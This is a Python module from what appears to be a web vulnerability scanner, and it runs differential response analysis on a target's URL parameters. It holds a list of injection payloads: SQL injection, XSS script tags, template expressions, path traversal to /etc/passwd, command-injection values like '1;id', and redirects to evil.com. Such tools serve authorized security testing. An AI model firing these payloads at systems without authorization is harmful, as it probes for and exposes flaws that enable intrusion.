"""
modules/diff_analysis.py
------------------------
Differential Response Analysis.

Compares responses to detect:
  - SQLi (error-based, boolean, time-based)
  - XSS reflection
  - SSTI (template injection)
  - LFI/Path traversal
  - Command injection

Technique: send baseline (safe) + attack payload, compare.
"""

import hashlib
import time
import re
from typing import List, Dict, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from core.rate_limiter import acquire
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("diff_analysis")


# ─────────────────────────────────────────
# Attack payload pairs (baseline, attack, vuln_type)
# ─────────────────────────────────────────
PAYLOAD_PAIRS = [
    # SQLi boolean-based
    ("1", "1' AND '1'='2", "sqli_boolean"),
    ("1", "1' AND '1'='1", "sqli_boolean"),
    # SQLi error-based
    ("1", "1'", "sqli_error"),
    ("1", "1\"", "sqli_error"),
    # XSS reflection
    ("test", "test<script>alert(1)</script>", "xss_reflect"),
    ("test", "test\"><svg/onload=alert(1)>", "xss_reflect"),
    # SSTI arithmetic
    ("1", "{{7*7}}", "ssti_jinja"),
    ("1", "${7*7}", "ssti_freemarker"),
    ("1", "<%= 7*7 %>", "ssti_erb"),
    # LFI / Path traversal
    ("1", "../../../../etc/passwd", "lfi"),
    ("1", "....//....//....//etc/passwd", "lfi"),
    # Command injection
    ("1", "1;id", "cmdi"),
    ("1", "1|id", "cmdi"),
    ("1", "1`id`", "cmdi"),
    # Open redirect
    ("/", "//evil.com", "open_redirect"),
    ("/", "https://evil.com", "open_redirect"),
]


# ─────────────────────────────────────────
# Response signature
# ─────────────────────────────────────────
def _signature(response) -> Optional[Dict]:
    if response is None:
        return None
    body = response.text or ""
    return {
        "status": response.status_code,
        "length": len(body),
        "hash": hashlib.md5(body.encode("utf-8", errors="ignore")).hexdigest(),
        "body": body,
        "headers": dict(response.headers),
        "time": response.elapsed.total_seconds() if hasattr(response, "elapsed") else 0,
    }


def _similarity(a: Dict, b: Dict) -> float:
    """
    0.0 = completely different, 1.0 = identical.
    """
    if not a or not b:
        return 0.0
    score = 0.0
    # Status
    if a["status"] == b["status"]:
        score += 0.4
    # Hash
    if a["hash"] == b["hash"]:
        score += 0.4
    # Length (within 5%)
    la, lb = a["length"], b["length"]
    if la > 0 and lb > 0:
        ratio = min(la, lb) / max(la, lb)
        score += ratio * 0.2
    return score


# ─────────────────────────────────────────
# Detection logic per vuln type
# ─────────────────────────────────────────
def _is_interesting(baseline: Dict, attack: Dict,
                    vuln_type: str, payload: str) -> Optional[Dict]:
    """
    Decide if the difference is interesting (potential vuln).
    """
    if not baseline or not attack:
        return None

    # SQLi error-based
    if vuln_type == "sqli_error":
        error_markers = [
            "sql syntax", "mysql", "postgresql", "sqlite", "oracle",
            "unclosed quotation", "odbc", "microsoft ole db",
            "you have an error in your sql",
        ]
        body_low = attack["body"].lower()
        for m in error_markers:
            if m in body_low and m not in baseline["body"].lower():
                return {
                    "type": "sqli_error_based",
                    "evidence": f"SQL error marker detected: '{m}'",
                    "confidence": 85,
                    "severity": "critical",
                }

    # SQLi boolean-based
    if vuln_type == "sqli_boolean":
        sim = _similarity(baseline, attack)
        if sim < 0.6:
            return {
                "type": "sqli_boolean_suspect",
                "evidence": f"Response differs (similarity {sim:.2f})",
                "confidence": 40,
                "severity": "high",
            }

    # XSS reflection
    if vuln_type == "xss_reflect":
        if payload in attack["body"] and payload not in baseline["body"]:
            # Check if unescaped
            return {
                "type": "xss_reflection",
                "evidence": "Payload reflected unescaped in response",
                "confidence": 65,
                "severity": "medium",
            }

    # SSTI — check for arithmetic result
    if vuln_type.startswith("ssti_"):
        if "49" in attack["body"] and "49" not in baseline["body"]:
            return {
                "type": "ssti_confirmed",
                "evidence": "Template expression evaluated (7*7=49)",
                "confidence": 90,
                "severity": "critical",
            }

    # LFI
    if vuln_type == "lfi":
        if "root:x:" in attack["body"] or "[boot loader]" in attack["body"]:
            return {
                "type": "lfi_confirmed",
                "evidence": "/etc/passwd content in response",
                "confidence": 95,
                "severity": "critical",
            }

    # Command injection
    if vuln_type == "cmdi":
        if re.search(r"uid=\d+\(", attack["body"]) and not re.search(
                r"uid=\d+\(", baseline["body"]):
            return {
                "type": "command_injection",
                "evidence": "Command output reflected (uid=...gid=...)",
                "confidence": 90,
                "severity": "critical",
            }

    # Open redirect
    if vuln_type == "open_redirect":
        loc = attack["headers"].get("Location", "")
        if "evil.com" in loc:
            return {
                "type": "open_redirect",
                "evidence": f"Redirect to attacker-controlled host: {loc[:100]}",
                "confidence": 90,
                "severity": "medium",
            }

    return None


# ─────────────────────────────────────────
# Testing
# ─────────────────────────────────────────
def _inject(url: str, param: str, value: str) -> Optional[str]:
    try:
        p = urlparse(url)
        qs = parse_qs(p.query)
        qs[param] = [value]
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode(qs, doseq=True), ""))
    except Exception:
        return None


def test_url(url: str) -> List[Dict]:
    findings: List[Dict] = []
    try:
        qs = parse_qs(urlparse(url).query)
    except Exception:
        return findings
    if not qs:
        return findings

    # Limit to 3 params per URL to keep it fast
    for param in list(qs.keys())[:3]:
        for baseline_val, attack_val, vtype in PAYLOAD_PAIRS:
            baseline_url = _inject(url, param, baseline_val)
            attack_url = _inject(url, param, attack_val)
            if not baseline_url or not attack_url:
                continue

            try:
                acquire(baseline_url)
                base_resp = safe_request(baseline_url, timeout=10,
                                         allow_redirects=False)
                baseline = _signature(base_resp)

                acquire(attack_url)
                atk_resp = safe_request(attack_url, timeout=10,
                                        allow_redirects=False)
                attack = _signature(atk_resp)
            except Exception:
                continue

            result = _is_interesting(baseline, attack, vtype, attack_val)
            if result:
                findings.append({
                    "type": result["type"],
                    "url": attack_url,
                    "param": param,
                    "payload": attack_val,
                    "evidence": result["evidence"],
                    "severity": result["severity"],
                    "confidence": result["confidence"],
                })
                break  # one confirmed per param enough
    return findings


# ─────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────
def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "diff_analysis", output_root)
    urls = load_urls(domain, output_root)
    param_urls = [u for u in urls if "?" in u and "=" in u]

    if not param_urls:
        info("No parameter URLs to test")
        return {"count": 0, "findings": []}

    # Cap for speed
    sample = param_urls[:40]
    info(f"Differential analysis on {len(sample)} URLs")

    all_findings: List[Dict] = []
    for url in sample:
        try:
            all_findings.extend(test_url(url))
        except Exception as e:
            log.debug(f"diff analysis failed {url}: {e}")

    # Save
    for f in all_findings:
        save_finding(domain, "diff_analysis", f["type"], f["severity"],
                     f["url"], param=f.get("param", ""),
                     payload=f.get("payload", ""),
                     evidence=f.get("evidence", ""),
                     confidence=f.get("confidence", 0),
                     scan_id=scan_id, output_root=output_root)

    if all_findings:
        write_lines(mdir / "diff_analysis_findings.txt",
                    [f"[{f['severity']}] {f['type']} → {f['url']} ({f['param']})"
                     for f in all_findings])
        ok(f"Found {len(all_findings)} differential finding(s)")

    return {"count": len(all_findings), "findings": all_findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Differential response analysis")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "diff_analysis", run, args.output)